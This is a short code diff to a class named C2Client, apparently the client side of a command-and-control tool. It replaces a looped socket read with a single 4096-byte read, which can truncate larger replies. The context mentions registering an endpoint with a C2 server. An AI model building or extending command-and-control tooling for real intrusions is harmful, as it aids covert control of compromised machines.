@@ -120,14 +120,13 @@ class C2Client:
             received_data = b""
             sock.connect((self.dest_ip,self.dest_port))    
             sock.sendall(json.dumps(server_message).encode())
-            data = sock.recv(1024)
-            while data:
-                received_data += data
-                data = sock.recv(1024)
-                logger.debug(data)
+            data = sock.recv(4096)
+            received_data += data
+            logger.debug(data)
         response_decoded = json.loads(received_data.decode())
         logger.debug(f"Closing connection to {self.dest_ip}:{self.dest_port}")
         return response_decoded
+        
     
     def register_endpoint(self):
         # reach out to C2 server and get an endpoint UUID
